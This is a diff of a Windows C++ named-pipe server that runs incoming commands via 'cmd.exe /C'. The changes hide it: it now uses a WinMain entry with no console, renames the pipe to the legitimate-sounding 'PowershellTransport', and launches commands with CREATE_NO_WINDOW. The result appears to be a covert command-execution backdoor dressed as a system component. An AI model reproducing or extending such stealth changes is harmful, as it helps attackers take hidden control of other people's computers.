@@ -13,14 +13,13 @@
 DWORD WINAPI InstanceThread(LPVOID);
 VOID GetAnswerToRequest(LPTSTR, LPTSTR, LPDWORD);
 
-
-int _tmain(VOID)
-{
+int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
+//int _tmain(VOID){
     BOOL   fConnected = FALSE;
     DWORD  dwThreadId = 0;
     HANDLE server = INVALID_HANDLE_VALUE;
     HANDLE hThread = NULL;
-    LPCTSTR lpszPipename = TEXT("\\\\.\\pipe\\jakepipe");
+    LPCTSTR lpszPipename = TEXT("\\\\.\\pipe\\PowershellTransport");
 
     /*
     ---------------------------------------------------------------------------------------------------------
@@ -306,13 +305,15 @@ std::wstring execCmd(std::wstring cmd, DWORD MAX_TIME)
     si.hStdError = hStdOutPipeWrite;
     si.hStdOutput = hStdOutPipeWrite;
     si.hStdInput = hStdInPipeRead;
+
     PROCESS_INFORMATION pi = { };
+    
     std::string output;
     cmd = L"cmd.exe /C " + cmd;
     LPSECURITY_ATTRIBUTES lpProcessAttributes = NULL;
     LPSECURITY_ATTRIBUTES lpThreadAttribute = NULL;
     BOOL bInheritHandles = TRUE;
-    DWORD dwCreationFlags = 0;
+    DWORD dwCreationFlags = CREATE_NO_WINDOW;
     LPVOID lpEnvironment = NULL;
     LPCWSTR lpCurrentDirectory = NULL;
 
@@ -393,6 +394,7 @@ VOID GetAnswerToRequest(LPTSTR pchRequest, LPTSTR pchReply, LPDWORD pchBytes)
         printf("StringCchCopy failed, no outgoing message.\n");
         return;
     }
+    pchReply[BUFSIZE - 1] = '\0';
     *pchBytes = (lstrlen(pchReply) + 1) * sizeof(TCHAR);
     return;
 }
